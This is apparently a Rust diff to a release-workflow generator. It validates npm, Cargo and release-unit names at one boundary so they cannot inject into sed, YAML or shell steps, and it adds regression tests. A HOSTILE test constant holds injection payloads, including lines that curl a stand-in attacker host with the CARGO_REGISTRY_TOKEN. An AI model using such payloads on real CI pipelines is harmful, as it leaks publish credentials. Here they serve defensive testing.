@@ -20,6 +20,7 @@
 
 use crate::config::{Config, GithubConfig, PrefixNamespaces, WorkflowRole};
 use crate::error::{Error, Result};
+use crate::executor::names;
 use crate::executor::recipe::{
     resolve_publications, Packager, SelectedPublication, PRIMARY_TARGET,
 };
@@ -817,7 +818,8 @@ fn publish_contract(
     // the same immutable bytes. Distinctness is the release unit and the
     // packager that produces the format: two destinations of one packager are
     // one subject, and two package formats of one release unit are two.
-    let subjects = distinct_subjects(root, config, &selection.selected);
+    let subjects = distinct_subjects(root, config, &selection.selected)
+        .map_err(|diagnostic| vec![diagnostic])?;
     let mut build_jobs = Vec::new();
     for subject in &subjects {
         let id = format!("{}build_{}", namespaces.job, subject.slug);
@@ -980,7 +982,7 @@ fn distinct_subjects(
     root: &Path,
     config: &Config,
     publications: &[SelectedPublication],
-) -> Vec<DistinctSubject> {
+) -> std::result::Result<Vec<DistinctSubject>, WorkflowDiagnostic> {
     let mut subjects: Vec<DistinctSubject> = Vec::new();
     for publication in publications {
         // Losing this collapse is not visible in the emitted document unless
@@ -996,7 +998,13 @@ fn distinct_subjects(
         subjects.push(DistinctSubject {
             release_unit: publication.release_unit.clone(),
             packager: publication.packager,
-            identity: subject_identity(root, unit, publication),
+            identity: subject_identity(root, unit, publication).map_err(|message| {
+                WorkflowDiagnostic::at(
+                    "subject-identity-invalid",
+                    message,
+                    &format!("release-units.{}", publication.release_unit),
+                )
+            })?,
             working_directory: unit.path.display().to_string(),
             slug: format!(
                 "{}_{}",
@@ -1005,7 +1013,7 @@ fn distinct_subjects(
             ),
         });
     }
-    subjects
+    Ok(subjects)
 }
 
 /// Identity the destinations of one subject resolve it by.
@@ -1025,35 +1033,68 @@ fn distinct_subjects(
 /// arm; it must never make its fragment record the release-unit id instead,
 /// because that agrees with the seal by making both sides wrong and silently
 /// retires the cross-check.
+///
+/// This is also where a subject identity enters the model, so it is where the
+/// value is held to a name its ecosystem could publish. Everything downstream
+/// treats it as a name: it is written into a `sed` address, printed into a YAML
+/// scalar, and passed to an Action. Validating at each of those is a rule the
+/// next sink does not inherit, so the value is refused here instead and the
+/// diagnostic names the manifest an author has to edit.
 fn subject_identity(
     root: &Path,
     unit: &crate::config::ReleaseUnitConfig,
     publication: &SelectedPublication,
-) -> String {
-    let fallback = publication.release_unit.clone();
+) -> std::result::Result<String, String> {
     let directory = root.join(&unit.path);
+    // The release-unit identifier is repository content whether or not it
+    // stands in as the subject identity: it reaches an Action input, the
+    // observation's YAML, and the publication identity verification resolves.
+    // So it is held to the rule for every subject, and the manifest name is
+    // held to its ecosystem's rule on top of that.
+    let unit_origin = format!("release unit {}", publication.release_unit);
+    let fallback = names::release_unit(&names::SuppliedName {
+        origin: &unit_origin,
+        value: &publication.release_unit,
+    })?;
+    let fallback = Ok(fallback);
     match publication.packager {
-        Packager::Npm => std::fs::read_to_string(directory.join("package.json"))
-            .ok()
-            .and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok())
-            .and_then(|manifest| {
-                manifest
-                    .get("name")
-                    .and_then(serde_json::Value::as_str)
-                    .map(str::to_owned)
+        Packager::Npm => {
+            let Some(name) = std::fs::read_to_string(directory.join("package.json"))
+                .ok()
+                .and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok())
+                .and_then(|manifest| {
+                    manifest
+                        .get("name")
+                        .and_then(serde_json::Value::as_str)
+                        .map(str::to_owned)
+                })
+            else {
+                return fallback;
+            };
+            names::npm_package(&names::SuppliedName {
+                origin: &format!("{} package.json name", unit.path.display()),
+                value: &name,
             })
-            .unwrap_or(fallback),
-        Packager::Cargo => std::fs::read_to_string(directory.join("Cargo.toml"))
-            .ok()
-            .and_then(|text| text.parse::<toml_edit::DocumentMut>().ok())
-            .and_then(|manifest| {
-                manifest
-                    .get("package")
-                    .and_then(|package| package.get("name"))
-                    .and_then(|name| name.as_str())
-                    .map(str::to_owned)
+        }
+        Packager::Cargo => {
+            let Some(name) = std::fs::read_to_string(directory.join("Cargo.toml"))
+                .ok()
+                .and_then(|text| text.parse::<toml_edit::DocumentMut>().ok())
+                .and_then(|manifest| {
+                    manifest
+                        .get("package")
+                        .and_then(|package| package.get("name"))
+                        .and_then(|name| name.as_str())
+                        .map(str::to_owned)
+                })
+            else {
+                return fallback;
+            };
+            names::cargo_crate(&names::SuppliedName {
+                origin: &format!("{} Cargo.toml package name", unit.path.display()),
+                value: &name,
             })
-            .unwrap_or(fallback),
+        }
         Packager::GoReleaser | Packager::Buildx | Packager::DevContainerCli => fallback,
     }
 }
@@ -3960,10 +4001,15 @@ release-units:
     fn stub_client(directory: &Path, client: &str, script: &str) -> PathBuf {
         let path = directory.join(client);
         std::fs::create_dir_all(directory).expect("stub directory");
+        // Every stub writes to standard error on every call, including the
+        // calls that succeed. Real clients do: npm emits warnings, notices and
+        // its update notice there routinely. A silent stub is what let a helper
+        // that merged the two streams pass -- the merged value was only ever
+        // exercised against a client that had nothing to say.
         std::fs::write(
             &path,
             format!(
-                "#!/usr/bin/env bash\nprintf '%s\\n' \"$*\" >> \"${{STUB_LOG}}\"\n{script}\nexit 0\n"
+                "#!/usr/bin/env bash\nprintf '%s\\n' \"$*\" >> \"${{STUB_LOG}}\"\necho '{client} warn Unknown env config \"registry-scope\"' >&2\n{script}\nexit 0\n"
             ),
         )
         .expect("stub written");
@@ -4017,6 +4063,112 @@ release-units:
         )
     }
 
+    /// Every value a maintained recipe reads out of the repository it releases.
+    ///
+    /// This is the list the boundary rule is written against, so it is written
+    /// down rather than inferred: each entry is a place a repository author
+    /// types a name that derivation then puts into a script, a document or a
+    /// command line. Fixing one of them per sink is what let the first
+    /// injection be closed for the registry name while the package name walked
+    /// through the same gap into a `sed` address; the answer is to hold every
+    /// entry to the same rule and to keep the list where a new entry has to
+    /// join it.
+    const REPOSITORY_SUPPLIED: [(&str, &str, &str); 4] = [
+        (
+            "component/Cargo.toml",
+            "[package]\nname = \"@VALUE@\"\nversion = \"1.0.0\"\n",
+            "subject-identity-invalid",
+        ),
+        (
+            "component/Cargo.toml",
+            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"@VALUE@\"]\n",
+            "recipe-underivable",
+        ),
+        (
+            "component/package.json",
+            r#"{"name":"@VALUE@","version":"1.0.0"}"#,
+            "subject-identity-invalid",
+        ),
+        (
+            ".intentional/config.yml",
+            "@RELEASE_UNIT@",
+            "subject-identity-invalid",
+        ),
+    ];
+
+    /// Values that are executable text, or that reshape a document, at a sink.
+    ///
+    /// The first two are the review's own reproductions, kept verbatim. The
+    /// `sed` one is the sharp case: it is correctly `env:`-routed and correctly
+    /// quoted, and GNU `sed`'s `e` command executes it anyway, because quoting
+    /// a value into a shell command does not stop the command from
+    /// interpreting it.
+    const HOSTILE: [&str; 4] = [
+        r#"a\"$/e echo PWNED; sh -c 'curl http://attacker.example/$CARGO_REGISTRY_TOKEN' #"#,
+        "a\"; curl http://attacker.example/$CARGO_REGISTRY_TOKEN; #",
+        "a\nname",
+        "a$(id)",
+    ];
+
+    // Every name a maintained recipe reads out of the repository reaches a
+    // sink that interprets text: a shell body, a `sed` address, a YAML scalar
+    // printed with `printf '"%s"'`, an argument vector. Validating per sink is
+    // the mistake this replaces -- the registry name was closed that way and
+    // the package name reached a `sed` address through the same gap, where
+    // GNU `sed`'s `e` command executes its argument. So the property asserted
+    // is the boundary one: every entry in REPOSITORY_SUPPLIED refuses every
+    // value in HOSTILE, with a diagnostic naming where to fix it, and nothing
+    // hostile appears in a derived workflow.
+    #[test]
+    fn refuses_every_repository_supplied_name_that_a_sink_would_interpret() {
+        for (file, template, code) in REPOSITORY_SUPPLIED {
+            for hostile in HOSTILE {
+                let workspace = if file == "component/package.json" {
+                    npm_workspace("workflow-supplied-names")
+                } else {
+                    workspace("workflow-supplied-names")
+                };
+                if file == ".intentional/config.yml" {
+                    // The release-unit identifier is a configuration key, and
+                    // it stands in as the subject identity for a packager
+                    // whose manifest names nothing.
+                    workspace.write(
+                        ".intentional/config.yml",
+                        &CONFIG.replace("  component:", &format!("  {hostile}:")),
+                    );
+                } else {
+                    workspace.write(file, &template.replace("@VALUE@", hostile));
+                }
+                let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None);
+                let Ok(comparison) = comparison else {
+                    // A configuration this malformed is refused before
+                    // derivation, which is the same answer earlier.
+                    continue;
+                };
+                assert_eq!(
+                    comparison.status,
+                    ComparisonStatus::Blocked,
+                    "{file} carrying {hostile:?} derives a workflow"
+                );
+                // A value that survives its own file's syntax has to be
+                // refused by the name rule; one that does not is refused
+                // earlier, by the parser, which is the same answer sooner.
+                let codes = comparison
+                    .diagnostics
+                    .iter()
+                    .map(|diagnostic| diagnostic.code.clone())
+                    .collect::<Vec<_>>();
+                assert!(
+                    codes.iter().any(|reported| reported == code)
+                        || codes
+                            .iter()
+                            .any(|reported| reported == "publication-unresolved"),
+                    "{file} carrying {hostile:?} is refused as {code} or as unparsable: {codes:?}"
+                );
+            }
+        }
+    }
+
     // Two names reach a maintained recipe from repository content rather than
     // from this derivation: the Cargo registry `package.publish` names, and the
     // npm package name GitHub Package Registry has to resolve. The first lands
@@ -4040,7 +4192,7 @@ release-units:
         assert!(
             comparison.diagnostics[0]
                 .message
-                .contains("is not a registry name"),
+                .contains("is not a Cargo registry name"),
             "{:?}",
             comparison.diagnostics[0]
         );
@@ -4175,6 +4327,160 @@ release-units:
                     .any(|line| line
                         .contains("npm_config_userconfig=\"${INTENTIONAL_WORK}/clean/npmrc\"")),
                 "the {target} retrieval runs under that configuration rather than the job's"
+            );
+        }
+    }
+
+    // Cargo spells "the index does not carry this crate" and "I did not look,
+    // because I was told not to go online" with the same words, and the probe
+    // copies the workspace's own cargo configuration into itself -- so a
+    // repository carrying `[net] offline = true` could make every probe report
+    // absence for a crate the registry has held for years, and the authenticate
+    // step would then write the long-lived token into the job. Telling the two
+    // messages apart is not possible; refusing to be offline is. The same
+    // resolve withholds the publish credential where the recorded retrieval is
+    // the public one, so that claim is structural rather than a fact about how
+    // cargo happens to authenticate index reads.
+    #[test]
+    fn resolves_online_and_without_the_credential_a_public_retrieval_may_not_use() {
+        for (label, workspace, manifest, withholds) in [
+            (
+                "the crates.io primary",
+                workspace("workflow-cargo-online-primary"),
+                "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\n",
+                Some("CARGO_REGISTRY_TOKEN"),
+            ),
+            (
+                "a configured alternate registry",
+                workspace("workflow-cargo-online-alternate"),
+                "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"example-registry\"]\n",
+                None,
+            ),
+        ] {
+            workspace.write("component/Cargo.toml", manifest);
+            converge(workspace.root(), WorkflowRole::Publish);
+            let steps = publisher_steps(workspace.root(), PRIMARY_TARGET);
+            let resolvers = steps
+                .iter()
+                .filter_map(|step| step.get("run").and_then(Value::as_str))
+                .filter(|body| body.contains("cargo add"))
+                .collect::<Vec<_>>();
+            assert!(
+                !resolvers.is_empty(),
+                "{label} resolves its destination through cargo"
+            );
+            for body in resolvers {
+                for command in ["cargo add", "cargo fetch"] {
+                    let invocation = body
+                        .split_once(command)
+                        .map(|(head, _)| head)
+                        .expect("the resolve runs the command");
+                    let preamble = invocation
+                        .rsplit("&&")
+                        .next()
+                        .unwrap_or_default()
+                        .to_owned()
+                        + invocation.rsplit('\n').next().unwrap_or_default();
+                    assert!(
+                        preamble.contains("CARGO_NET_OFFLINE=false"),
+                        "{label} forces {command} online: {preamble:?}"
+                    );
+                    match withholds {
+                        Some(variable) => assert!(
+                            preamble.contains(&format!("env -u {variable}")),
+                            "{label} withholds {variable} from {command}: {preamble:?}"
+                        ),
+                        None => assert!(
+                            !preamble.contains("env -u"),
+                            "{label} keeps the credential its recorded retrieval uses: {preamble:?}"
+                        ),
+                    }
+                }
+            }
+        }
+    }
+
+    // The existence probe answers two questions with one call: whether the
+    // destination holds the release, and what it holds. The second answer
+    // becomes the destination digest the readback compares against the promoted
+    // integrity, so anything else the client said on the way becomes a
+    // disagreement the recipe reports as the registry publishing bytes the
+    // release never sent -- a conflict observation that fails the publication
+    // and accuses the wrong party. npm writes warnings and notices to standard
+    // error on successful calls, so the two streams have to stay apart. This
+    // runs the derived helper against a client that talks on both.
+    #[test]
+    fn answers_only_with_what_the_registry_answered() {
+        let workspace = npm_workspace("workflow-probe-streams");
+        converge(workspace.root(), WorkflowRole::Publish);
+        let readback = publisher_steps(workspace.root(), PRIMARY_TARGET)
+            .into_iter()
+            .find(|step| step_environment(step).contains_key("INTENTIONAL_OBSERVATION"))
+            .expect("the recipe reads its destination back");
+        let body = readback["run"].as_str().expect("a script");
+        let start = body
+            .find("INTENTIONAL_npm_holds() {")
+            .expect("the recipe defines an existence probe");
+        let end = body[start..]
+            .find("\n}\n")
+            .expect("the probe is a shell function");
+        let helper = &body[..start + end + "\n}\n".len()];
+
+        let temporary = workspace.root().join("runner");
+        std::fs::create_dir_all(&temporary).expect("runner directory");
+        let integrity = "sha512-anintegritythepublishedreleaseactuallycarries";
+        for (label, script, expected, status) in [
+            (
+                "a successful call that also warns",
+                format!("case \"$1\" in view) echo '{integrity}' ;; esac"),
+                integrity,
+                0,
+            ),
+            (
+                "a package the registry does not hold",
+                "case \"$1\" in view) echo 'npm error code E404' >&2; exit 1 ;; esac".to_owned(),
+                "",
+                1,
+            ),
+            (
+                "a call the registry did not answer",
+                "case \"$1\" in view) echo 'npm error network request failed' >&2; exit 1 ;; esac"
+                    .to_owned(),
+                "",
+                2,
+            ),
+        ] {
+            let stubs = stub_client(&temporary.join(status.to_string()), "npm", &script);
+            let answer = temporary.join("answer");
+            let mut command = std::process::Command::new("bash");
+            command
+                .arg("-c")
+                .arg(format!(
+                    "{helper}\nINTENTIONAL_npm_holds example > \"{}\"; exit $?",
+                    answer.display()
+                ))
+                .env(
+                    "PATH",
+                    format!(
+                        "{}:{}",
+                        stubs.display(),
+                        std::env::var("PATH").unwrap_or_default()
+                    ),
+                )
+                .env("STUB_LOG", temporary.join("stub.log"))
+                .env("RUNNER_TEMP", &temporary)
+                .env("INTENTIONAL_REGISTRY", "https://registry.example");
+            let output = command.output().expect("the probe runs");
+            assert_eq!(
+                output.status.code(),
+                Some(status),
+                "{label} classifies as {status}: {}",
+                String::from_utf8_lossy(&output.stderr)
+            );
+            assert_eq!(
+                std::fs::read_to_string(&answer).unwrap_or_default(),
+                expected,
+                "{label} returns only what the registry answered"
             );
         }
     }
